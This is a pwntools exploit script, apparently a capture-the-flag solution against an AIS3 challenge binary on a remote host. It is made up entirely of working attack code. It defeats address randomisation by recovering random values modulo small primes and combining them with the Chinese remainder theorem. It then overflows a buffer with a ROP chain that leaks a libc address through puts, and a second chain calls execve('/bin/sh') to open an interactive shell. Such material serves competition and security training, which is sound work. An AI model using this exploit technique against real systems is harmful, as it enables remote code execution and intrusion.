from pwn import *
from sage.all import crt
import string

context.arch = "amd64"
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc.so.6")
elf = ELF("./src/chall")
# io = gdb.debug("./src/chall", "b *(main+399)\nc")
# io = process("./src/chall")
io = remote("chals1.ais3.org", 1234)

charset = string.ascii_letters


def get_rand_mod(p):
    cs = charset[:p]
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"set: ", cs)
    io.sendlineafter(b"password: ", b"2")
    io.recvuntil(b"is: ")
    pwd = io.recvlineS().strip()
    return (cs.index(pwd[1]) - 2) % p


primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43]
mods = [get_rand_mod(p) for p in primes]
print(mods)
prog_base = int(crt(mods, primes)) - elf.sym["rand_num"]
print(f"{prog_base = :#x}")
elf.address = prog_base

pop_rdi = ROP(elf).find_gadget(["pop rdi", "ret"]).address
print(hex(pop_rdi))

rop1 = flat([pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"]])
assert b"\n" not in rop1 and b"\x20" not in rop1

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"set: ", b"x" * 88 + rop1)
io.sendlineafter(b"password: ", b"1")
io.sendlineafter(b"> ", b"3")

libc_addr = int.from_bytes(io.recvn(6), "little") - libc.sym["puts"]
print(f"{libc_addr = :#x}")
libc.address = libc_addr

r = ROP(libc)
r.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)
rop2 = r.chain()
print(rop2)
assert b"\n" not in rop2 and b"\x20" not in rop2

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"set: ", b"x" * 88 + rop2)
io.sendlineafter(b"password: ", b"1")
io.sendlineafter(b"> ", b"3")

io.interactive()
